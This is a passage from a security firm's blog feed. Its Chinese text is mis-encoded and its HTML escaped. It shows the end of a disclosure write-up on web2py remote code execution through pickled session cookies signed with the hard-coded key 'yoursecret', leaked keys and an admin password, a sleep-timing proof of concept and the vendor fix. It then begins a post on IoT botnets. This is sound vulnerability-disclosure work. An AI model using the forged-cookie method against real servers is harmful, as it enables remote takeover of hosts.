        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# &amp;lt;-- Bingo!!!
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Âõ†Ê≠§ÔºåÂ¶ÇÊûúÁü•ÈÅìÈÄ£Á∑ö‰∏≠Áî®‰ª•Âä†ÂØÜ cookie ÂÖßÂÆπÁöÑ encryption_keyÔºåÊîªÊìäËÄÖÂ∞±ÂèØ‰ª•ÂÅΩÈÄ† session cookieÔºåÈÄ≤ËÄåÂà©Áî® pickle.loads ÈÄ≤Ë°åÈÅ†Á´ØÂëΩ‰ª§Âü∑Ë°å„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3953&quot;&gt;CVE-2016-3953&lt;/h4&gt;

&lt;p&gt;ÂæàÂπ∏ÈÅãÁöÑÔºåÊàëÂÄëÁôºÁèæ web2py È†êË®≠ÈñãÂïüÁöÑÁØÑ‰æãÊáâÁî®Á®ãÂºèÊòØ‰ΩøÁî® session cookieÔºå‰∏¶‰∏îÊúâ‰∏ÄÂÄãÂØ´Ê≠ªÁöÑÂØÜÈë∞Ôºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;„ÄÇ[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/applications/examples/models/session.py&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;yoursecret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Âõ†Ê≠§Ôºåweb2py ÁöÑ‰ΩøÁî®ËÄÖÂ¶ÇÊûúÊ≤íÊúâÊâãÂãïÈóúÈñâÁØÑ‰æãÊáâÁî®Á®ãÂºèÔºåÊîªÊìäËÄÖÂ∞±ÂèØ‰ª•Áõ¥Êé•Âú® http://[target]/examples/ È†ÅÈù¢ÁôºÂãïÊîªÊìäÂèñÂæó‰∏ªÊ©üÊìç‰ΩúÊ¨ä„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h4&gt;

&lt;p&gt;ÊàëÂÄëÂòóË©¶Áî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt; ‰ΩúÁÇ∫ encryption_key ÂÅΩÈÄ†‰∏ÄÂÄãÂêàÊ≥ïÁöÑ session cookieÔºå‰∏¶Â∞á‰∏ÄÂÄãÊúÉÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§ sleep ÁöÑÁâ©‰ª∂Â°ûÂÖ•ÂÖ∂‰∏≠„ÄÇÂ∏∂ËëóÊ≠§ session cookie ÈÄ£ÂÖ• web2py ÂÆòÁ∂≤ÁØÑ‰æãÊáâÁî®Á®ãÂºè(http://www.web2py.com/examples)ÔºåÊÉÖÂΩ¢Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;Áï∂ÊèíÂÖ•ÁöÑÁâ©‰ª∂ÊúÉÂü∑Ë°åÊåá‰ª§ sleep 3 ÊôÇÔºåÁ∂≤Á´ôÂõûÊáâÊôÇÈñìÁÇ∫ 6.8 Áßí&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC1.png&quot; alt=&quot;POC1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áï∂ÊèíÂÖ•ÁöÑÁâ©‰ª∂ÊúÉÂü∑Ë°åÊåá‰ª§ sleep 5 ÊôÇÔºåÁ∂≤Á´ôÂõûÊáâÊôÇÈñìÁÇ∫ 10.8 Áßí&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC2.png&quot; alt=&quot;POC2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Á¢∫ÂØ¶ÊúÉÂõ†ÁÇ∫Â°ûÂÖ•ÁöÑ session cookie ÂÄº‰∏çÂêåËÄåÊúâÊâÄÂª∂ÈÅ≤ÔºåË≠âÊòéÁ∂≤Á´ôÁöÑÁ¢∫Âü∑Ë°å‰∫ÜÔºàÂÖ©Ê¨°ÔºâÊàëÂÄëÂÅΩÈÄ†ÁöÑÁâ©‰ª∂ÂÖßÂÆπ„ÄÇ&lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂÖ∂‰ªñÊ¥©ÊºèÂ∞éËá¥-rce&quot;&gt;ÂÖ∂‰ªñÊ¥©ÊºèÂ∞éËá¥ RCE&lt;/h3&gt;

&lt;p&gt;Ê≠§Â§ñÔºåÂú® web2py ÁØÑ‰æãÊáâÁî®Á®ãÂºèÁÇ∫‰∫ÜÁ§∫ÁØÑÊ°ÜÊû∂ÁöÑÁâπÊÄßÔºåÂõ†Ê≠§Ê¥©Êºè‰∫ÜË®±Â§öÁí∞Â¢ÉËÆäÊï∏„ÄÇÂÖ∂‰∏≠ÊúâÂÖ©ÂÄãËÆäÊï∏ËºÉÁÇ∫ÊïèÊÑüÔºåÈñìÊé•‰πüÊúÉÂ∞éËá¥Á´ØÂëΩ‰ª§Âü∑Ë°åÔºåÂàÜÂà•Â¶Ç‰∏ã„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3954&quot;&gt;CVE-2016-3954&lt;/h4&gt;

&lt;p&gt;Âú® http://[target]/examples/simple_examples/status È†ÅÈù¢‰∏≠Ôºåresponse ÂàÜÈ†ÅÂÖßÂÆπÊ¥©Êºè‰∫Ü session_cookie_key ÂÄº„ÄÇÈÄôÂÄãÂÄºÂ∞±ÊòØÁî®‰æÜÂä†ÂØÜÂâçÈù¢ÊâÄ‰ªãÁ¥πÁöÑ session cookieÔºåÊê≠ÈÖç CVE-2016-3957 Pickle ÁöÑÂïèÈ°åÂèØÁõ¥Êé•ÈÅ†Á´ØÂëΩ‰ª§Âü∑Ë°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3954.png&quot; alt=&quot;CVE-2016-3954&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁÑ°Ë´ñ‰ΩøÁî®ËÄÖÊòØÂê¶Ëá™Ë°åÊõ¥Êîπ session_cookie_keyÔºåÊàñÊòØË©≤ÂÄºÊòØÁ≥ªÁµ±Èö®Ê©üÁî¢Áîü„ÄÇÊ≠§‰ªãÈù¢‰ªçÁÑ∂ÂèØ‰ª•ÂèñÂæóÊ©üÊïèË≥áË®äËóâ‰ª•ÈÄ†ÊàêÂç±ÂÆ≥„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3952&quot;&gt;CVE-2016-3952&lt;/h4&gt;

&lt;p&gt;http://[target]/examples/template_examples/beautify È†ÅÈù¢Ê¥©Êºè‰∫ÜÁ≥ªÁµ±Áí∞Â¢ÉËÆäÊï∏ÔºåÁï∂‰ΩøÁî®ËÄÖÊòØ‰ΩøÁî® standalone ÁâàÊú¨ÊôÇÔºåÁÆ°ÁêÜËÄÖÁöÑÂØÜÁ¢ºÂ∞±ÊúÉÂú®Áí∞Â¢ÉËÆäÊï∏Ë£°Âá∫Áèæ„ÄÇÈÄôÂÄãÂØÜÁ¢ºÂèØÁôªÂÖ• http://[target]/admin ÁÆ°ÁêÜ‰ªãÈù¢ÔºåÁÆ°ÁêÜ‰ªãÈù¢ÂÖßÊèê‰æõÊñπ‰æøÁöÑÂäüËÉΩÂæó‰ª•Âü∑Ë°å‰ªªÊÑèÊåá‰ª§„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3952.png&quot; alt=&quot;CVE-2016-3952&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂÆòÊñπ‰øÆÂæ©&quot;&gt;ÂÆòÊñπ‰øÆÂæ©&lt;/h3&gt;

&lt;p&gt;Version 2.14.1 ÁßªÈô§Ê¥©ÊºèÁöÑÁí∞Â¢ÉËÆäÊï∏„ÄÇ[&lt;a href=&quot;https://github.com/web2py/web2py/commit/9706d125b42481178d2b423de245f5d2faadbf40&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;Version 2.14.2 ‰ΩøÁî®‰∏çÂõ∫ÂÆöÂ≠ó‰∏≤‰ΩúÁÇ∫ session_cookie_keyÔºå‰∏¶ÁßªÈô§Ê¥©ÊºèÈ†ÅÈù¢„ÄÇ&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gluon.utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ram&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;cookie_key&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;Á∏ΩÁµê&quot;&gt;Á∏ΩÁµê&lt;/h3&gt;

&lt;p&gt;web2py Ê°ÜÊû∂È†êË®≠ÊúÉÈñãÂïü‰∏ÄÂÄãÁØÑ‰æãÊáâÁî®Á®ãÂºèÔºåË∑ØÂæëÁÇ∫ http://[target]/examples/„ÄÇ&lt;br /&gt;
Áî±ÊñºÈÄôÂÄãÊáâÁî®Á®ãÂºè‰ΩøÁî® Pickle ‰æÜËôïÁêÜÂ∫èÂàóÂåñÁöÑ session cookieÔºå‰∏îÂõ†ÁÇ∫Âä†ÂØÜÂ≠ó‰∏≤ÁÇ∫ÂØ´Ê≠ªÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;Ôºå‰ªª‰Ωï‰∫∫ÂèØÁ´ÑÊîπ session cookie ÁöÑÂÖßÂÆπÔºåËóâÊ≠§ÈÄ≤Ë°å Pickle ÂëΩ‰ª§Âü∑Ë°åÊîªÊìä„ÄÇ&lt;br /&gt;
Ë©≤ÁØÑ‰æãÁ®ãÂºè‰ªãÈù¢‰∏≠‰πüÂ≠òÂú® session_cookie_key„ÄÅÁÆ°ÁêÜËÄÖÂØÜÁ¢ºÊ¥©ÊºèÂïèÈ°åÔºåÂÖ©ÂÄãÈÉΩÊúÉÂ∞éËá¥‰ªªÊÑèÂëΩ‰ª§Âü∑Ë°å„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÂú®ÈÄôÂÄãÊáâÁî®Á®ãÂºè‰∏≠Ê¥©ÊºèË®±Â§öÁ≥ªÁµ±ÈÖçÁΩÆ„ÄÅË∑ØÂæëÁ≠âË≥áË®äÔºåÊúâÊ©üÊúÉË¢´Êãø‰æÜÂÅöÈÄ≤ÈöéÊîªÊìä„ÄÇ&lt;br /&gt;
Âú® 2.14.2 ÁâàÊú¨ÂæåÂ∑≤Á∂ì‰øÆÂæ©ÊâÄÊúâÊ¥©ÊºèÂïèÈ°åÔºåÁï∂ÁÑ∂ÊúÄÂ•ΩÁöÑËß£Ê±∫Ëæ¶Ê≥ïÂ∞±ÊòØÈóúÈñâÈÄôÂÄãÁØÑ‰æãÊáâÁî®Á®ãÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÔºå‰æÜÊï¥ÁêÜÂæûÈñãÁôºËÄÖÁöÑËßíÂ∫¶Âú®ÈÄôÂÄãÊ°à‰æã‰∏≠Ë©≤Ê≥®ÊÑèÁöÑË¶ÅÈªûÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Â∞èÂøÉËôïÁêÜÂ∫èÂàóÂåñÂ≠ó‰∏≤Ôºå‰ΩøÁî®ËÄÖËã•ÊúâÊ©üÊúÉÊîπËÆäË©≤Â≠ó‰∏≤ÂÄºÔºåÊúâÊ©üÊúÉË¢´ÊèíÂÖ•Êú™È†êÊúüÁöÑÊÉ°ÊÑèÁâ©‰ª∂ÔºåÈÄ†ÊàêÊÉ°ÊÑèÁöÑÁµêÊûú„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ê≠£ÂºèÁî¢ÂìÅ‰∏≠ÂàáË®òË¶ÅÁßªÈô§‰ªª‰ΩïË∑üÈñãÁôºÁõ∏ÈóúÁöÑÈÖçÁΩÆ„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ÊôÇÈñìËª∏&quot;&gt;ÊôÇÈñìËª∏&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/03/08 ÁôºÁèæÂïèÈ°åËàáÂÖ∂‰ªñÁ†îÁ©∂&lt;/li&gt;
  &lt;li&gt;2016/03/09 ÂõûÂ†±ÂÆòÊñπ &lt;a href=&quot;https://github.com/web2py/web2py/issues/1205&quot;&gt;GitHub Issue&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2016/03/15 ÊàêÂäüËàáÈñãÁôºËÄÖ email ËÅØÁπ´&lt;/li&gt;
  &lt;li&gt;2016/03/15 ÂÆòÊñπ‰øÆÂæ©ÁÆ°ÁêÜËÄÖÂØÜÁ¢ºÊ¥©ÊºèÂïèÈ°å (CVE-2016-3952)&lt;/li&gt;
  &lt;li&gt;2016/03/25 ÂÆòÊñπ‰øÆÂæ©ÂÖ∂‰ªñÂº±Èªû‰∏¶Áôº‰Ωà 2.14.2 ÁâàÊú¨&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÈôÑË®ª&quot;&gt;ÈôÑË®ª&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;ÂÖ∂ÂØ¶ CVE-2016-3957 ‰∏¶Èùû‰∏çÂÆâÂÖ®ÁöÑË®≠Ë®àÔºåÂú®Ë∑ü CVE team Ê∫ùÈÄöÁöÑÈÅéÁ®ã‰∏≠ÁôºÁèæ web2py ÈñãÂßã‰ΩøÁî® JSON Âèñ‰ª£ Pickle [&lt;a href=&quot;https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0&quot;&gt;Ref&lt;/a&gt;]ÔºåÂõ†Ê≠§Âà§ÂÆö web2py Ë™çÁÇ∫ÁõÆÂâçÁöÑË®≠Ë®àÊòØ‰∏çÊ¥ΩÁï∂ÁöÑÔºåÁµ¶‰∫àÊ≠§Á∑®Ëôü„ÄÇÂæå‰æÜÂÆòÊñπÂõ†ÊïÖÂ∞á Pickle Êîπ‰∫ÜÂõû‰æÜÔºå‰∏çÈÅéÂú®Ê≤íÊúâÊ¥©ÊºèÂä†ÂØÜÂ≠ó‰∏≤ÁöÑÂâçÊèê‰∏ãÂ∑≤Á∂ìÊòØÂÆâÂÖ®ÁöÑ‰∫Ü„ÄÇ¬†&lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;Âú®Ëá™Ë°åÊû∂Ë®≠ÁöÑ web2py Áí∞Â¢É‰∏≠Âè™ÊúÉÂü∑Ë°å‰∏ÄÊ¨°ÔºåÊ≤íÊúâÂéªÁ¥∞ËøΩ web2py ÂÆòÊñπÁ∂≤Á´ôÁÇ∫‰ΩïÂü∑Ë°åÂÖ©Ê¨°„ÄÇ¬†&lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/</link>
                <guid>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957</guid>
                <pubDate>Tue, 03 Jan 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>IoTË®≠ÂÇôÂïÜÂà•ÊàêÁÇ∫Âπ´ÂÖá ÂæûDyn DDoSÊîªÊìä‰∫ã‰ª∂ÁúãIoTÂÆâÂÖ®</title>
                <description>&lt;h3 id=&quot;Ëê¨Áâ©ÁöÜËÅØÁ∂≤ÊàêÁÇ∫Ëê¨Áâ©ÁöÜÂèØÈß≠&quot;&gt;Ëê¨Áâ©ÁöÜËÅØÁ∂≤ÊàêÁÇ∫Ëê¨Áâ©ÁöÜÂèØÈß≠&lt;/h3&gt;

&lt;p&gt;2016Âπ¥10Êúà21Êó•Áü•ÂêçÁ∂≤Ë∑ØÊúçÂãô Dyn ÈÅ≠ÂèóÊÆ≠Â±çÁ∂≤Ë∑ØÁôºÂãï‰∏âÊ≥¢Â∑®Â§ßË¶èÊ®° DDoS ÊîªÊìäÔºå‰∏ñÁïåÂêÑÂ§ßÁ∂≤Á´ôÊúçÂãôÁöÜÂõ†ÁÇ∫Ê≠§ÊîªÊìäËÄå‰∏≠Êñ∑ÔºåÂåÖÊã¨ Amazon„ÄÅTwitter„ÄÅGithub„ÄÅPayPal Á≠âÂ§ßÂûãÁ∂≤Á´ôÈÉΩÂõ†Ê≠§ÂèóÂà∞ÂΩ±Èüø„ÄÇË≥áÂÆâ‰∫∫Âì°Á†îÁ©∂ÁôºÁèæÔºåÊú¨Ê¨° DDoS ÊîªÊìäÁöÑÁôºËµ∑ËÄÖÊú™ÊòéÔºå‰ΩÜÂ§öÊï∏ÊîªÊìäÊµÅÈáè‰æÜËá™ÊÆ≠Â±çÁ∂≤Ë∑Ø„ÄåMirai„ÄçÔºåÂà©Áî® IPCAM„ÄÅCCTV„ÄÅDVR„ÄÅIoT Ë£ùÁΩÆÁ≠âÁ≥ªÁµ±ÈÄ≤Ë°å DDoS ÊîªÊìä„ÄÇÁÇ∫‰ªÄÈ∫ºÈÄô‰∫õË®≠ÂÇôÊúÉÊàêÁÇ∫ÊîªÊìäÁöÑÂπ´Âá∂Âë¢ÔºüÊàëÂÄëÂèàË©≤Â¶Ç‰ΩïËá™‰øùÂë¢Ôºü&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;‰∏ÄÂÄãÊîªÊìä‰∫ã‰ª∂Ôºå‰∏ÄÂÆöÊúâËÉåÂæåÁöÑÂéüÂõ†„ÄÇÊîªÊìäËÄÖ‰∏ÄÂÆöÊòØÊúâÊâÄÊ±ÇÔºåÊâçÊúÉÈÄ≤Ë°åÊîªÊìäÔºåÂèØËÉΩÊòØÊ±ÇÂêç„ÄÅÊ±ÇÂà©ÊàñÊ±ÇÊ®ÇË∂£„ÄÇÂõ†ÁÇ∫ DDoS ÊîªÊìäÊúÉÁõ¥Êé•ÂΩ±ÈüøÁõÆÊ®ôÁ≥ªÁµ±ÁöÑÈÅã‰ΩúÔºåÂ∞çÁ≥ªÁµ±ÁáüÈÅãÈÄ†ÊàêÂΩ±ÈüøÔºåÂú®ÈªëËâ≤Áî¢Ê•≠ÁöÑÂæ™Áí∞‰∏≠ÈÄöÂ∏∏ÊúÉÂà©Áî®ÈÄôÁ®ÆÊîªÊìä‰æÜÂãíÁ¥¢Èå¢Ë≤°„ÄÇ‰æãÂ¶ÇÈáùÂ∞çÁáüÈÅãÁ∑ö‰∏äÈÅäÊà≤ÁöÑÂÖ¨Âè∏ÈÄ≤Ë°å DDoS ÊîªÊìäÔºåËÆìÈÅäÊà≤ÊúçÂãô‰∏≠Êñ∑ÔºåÈÄºËø´‰ºÅÊ•≠Â∞á‰∏ªÊ©üÁöÑÈÄ£Á∑öËä±Èå¢„ÄåË¥ñ„ÄçÂõû‰æÜ„ÄÇ‰ΩÜ Dyn ÈÄôÊ¨°ÁöÑ‰∫ã‰ª∂ÂêÑÂÆ∂ÈÉΩÊ≤íÊúâÊî∂Âà∞È°û‰ººÁöÑÂãíÁ¥¢‰ø°ÔºåÂõ†Ê≠§Ë≥áÂÆâÂ∞àÂÆ∂ÂÄëÊé®Ê∏¨ÔºåÈÄôÂèØËÉΩÊòØ‰∏ÄÊ¨°Á∑¥ÂÖµÔºåÊàñËÄÖÁîöËá≥ÊòØ DDoS ÊîªÊìäÊúçÂãôÁöÑË°åÈä∑ÊâãÊ≥ï„ÄÇÂ¶ÇÊûúÊàëÂÄëÁî®ÈªëËâ≤Áî¢Ê•≠ÁöÑËßíÂ∫¶ÂéªÊÄùËÄÉ‰∏ÄÂÄãÊîªÊìäË°åÁÇ∫ÔºåÂ∞±ÊúÉÊúâÊà™ÁÑ∂‰∏çÂêåÁöÑÁúãÊ≥ï„ÄÇË©¶ÊÉ≥ÔºåÂ¶ÇÊûúÈÄôÊòØ‰∏ÄÊ¨°Èß≠ÂÆ¢ÁµÑÁπîÁöÑÂïÜÊ•≠Ë°åÈä∑Ë°åÁÇ∫ÔºåÁõÆÁöÑÊòØÂ±ïÁèæÈÄôÂÄãÂúòÈöäÁöÑ DDoS ÊîªÊìäÁÅ´ÂäõÔºåÈÄôÊ®£ÁöÑÊàêÊûúÊòØÂê¶ÂèØ‰ª•Á®±‰ΩúÊòØ‰∏ÄÂÄãÊàêÂäüÊ°à‰æãÂë¢ÔºüÂ¶ÇÊûú‰Ω†ÊòØÊúçÂãôË≥ºË≤∑ËÄÖÔºåÊòØÂê¶Â∞çÈÄôÊ®£ÁöÑÊúçÂãôÊúâ‰ø°ÂøÉÂë¢Ôºü&lt;/p&gt;

&lt;p&gt;Âà©Áî® IoT Ë£ùÁΩÆÂèäÁ∂≤ÈÄöË®≠ÂÇô‰ΩàÂª∫ÊÆ≠Â±çÁ∂≤Ë∑Ø (botnet) Â∑≤Á∂ì‰∏çÊòØÊñ∞ËÅû„ÄÇInternet Census 2012 ÊòØ‰∏ÄÊ¨°Ë≥áÂÆâÂúàÁöÑÂ§ß‰∫ã‰ª∂Ôºå‰∏ÄÂÄãÁ®±ÁÇ∫ Carna ÁöÑ botnet Âà©Áî®‰∫ÜÂÖ®‰∏ñÁïå 42 Ëê¨Âè∞Ë£ùÁΩÆÔºåÊéÉÊèèÂÖ®‰∏ñÁïåÊï¥ÂÄã IPv4 Ë®≠ÂÇôÔºåËíêÈõÜ IP ‰ΩøÁî®ÁãÄÊ≥Å„ÄÅÈÄ£Êé•Âü†„ÄÅÊúçÂãôÊ®ôÈ†≠Á≠âË≥áË®äÔºå‰∏¶‰∏îÊèê‰æõÂÖ±Ë®à 9TB Ë≥áÊñôÈñãÊîæ‰∏ãËºâÁ†îÁ©∂„ÄÇËÄåÈÄôÂÄã botnet Â§öÊï∏Âà©Áî®Ë∑ØÁî±Âô® (router) ÁöÑÊºèÊ¥ûÔºåÂà©Áî®È†êË®≠ÂØÜÁ¢º„ÄÅÁ©∫ÂØÜÁ¢ºÁôªÂÖ•Ë®≠ÂÇôÔºåÊ§çÂÖ•ÂæåÈñÄ‰æõÊîªÊìäËÄÖÊéßÂà∂„ÄÇËÄåÂæåÁöÑÂπæÊ¨°Â§ßÂûãÊîªÊìä‰∫ã‰ª∂ÈÉΩËàá IoT ÂèäÂµåÂÖ•ÂºèË£ùÁΩÆÊúâÈóú‰øÇÔºåËÆì IoT ÁöÑÂè£Ëôü„ÄåËê¨Áâ©ÁöÜËÅØÁ∂≤„ÄçÊàêÁÇ∫„ÄåËê¨Áâ©ÁöÜÂèØÈß≠„ÄçÔºå‰πüËÆìË≥áÂÆâÁ†îÁ©∂‰∫∫Âì°Â∞çÊñºÁ†îÁ©∂ÈÄôÈ°ûÂûãË®≠ÂÇôË∂®‰πãËã•È∂©„ÄÇËøëÂπ¥Êô∫ÊÖßËªäËºõ‰∏çÊñ∑ÁôºÂ±ïÔºåÂúãÈöõÈñì‰πü‰∏çÂ∞ëÊô∫ÊÖßËªäËºõË¢´Èß≠ÁöÑ‰∫ã‰ª∂„ÄÇËªäËºõË¢´Èß≠ÂΩ±ÈüøÁöÑÂ∞±‰∏çÂñÆÊòØË≥áË®äÁ≥ªÁµ±ÔºåÊõ¥ÊúÉÊ≥¢Âèä‰∫∫Ë∫´ÂÆâÂÖ®ÁîöËá≥Êï¥ÂÄãÂüéÂ∏ÇÁöÑ‰∫§ÈÄöÔºåË≥áÂÆâËÄÉÈáèÁöÑÂΩ±Èüø‰πüÈÅ†ÊØî‰ª•ÂâçÂö¥Èáç„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÈÄ£Á∂≤Ë£ùÁΩÆÊàêÁÇ∫Èß≠ÂÆ¢‰∏ãÊâãÁöÑ‰∏ªË¶ÅÂéüÂõ†&quot;&gt;ÈÄ£Á∂≤Ë£ùÁΩÆÊàêÁÇ∫Èß≠ÂÆ¢‰∏ãÊâãÁöÑ‰∏ªË¶ÅÂéüÂõ†&lt;/h3&gt;

